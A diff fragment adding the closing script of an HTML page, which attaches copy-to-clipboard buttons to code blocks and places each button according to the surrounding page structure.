+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
